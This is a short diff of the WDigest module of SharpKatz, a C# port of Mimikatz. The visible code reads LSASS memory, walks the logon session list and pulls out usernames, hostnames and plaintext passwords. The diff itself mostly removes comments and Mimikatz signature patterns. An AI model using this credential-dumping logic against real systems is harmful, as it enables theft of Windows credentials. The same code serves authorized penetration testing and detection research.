@@ -10,19 +10,8 @@ namespace SharpKatz.Module
 {
     class WDigest
     {
-        /*
-         KULL_M_PATCH_GENERIC WDigestReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
-};
-             */
 
         static long max_search_size = 200000;
-
-        // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
-
-        //BYTE PTRN_WIN5_PasswdSet[]	= {0x48, 0x3b, 0xda, 0x74};
 
         [StructLayout(LayoutKind.Sequential)]
         public struct KIWI_WDIGEST_LIST_ENTRY
@@ -52,7 +41,6 @@ namespace SharpKatz.Module
 
             //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());
 
-            // Read first entry from linked list
             byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, logSessListAddr, Convert.ToUInt64(sizeof(KIWI_WDIGEST_LIST_ENTRY)));
             IntPtr pThis = new IntPtr(BitConverter.ToInt64(entryBytes, Utility.FieldOffset<KIWI_WDIGEST_LIST_ENTRY>("This")));
 
@@ -73,7 +61,7 @@ namespace SharpKatz.Module
                     string hostname = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pHostname));
                     string password = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pPassword));
 
-                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
+                    if (!string.IsNullOrEmpty(username) && username.Length > 1 )
                     {
                         Natives.LUID luid = entry.LocallyUniqueIdentifier;
 
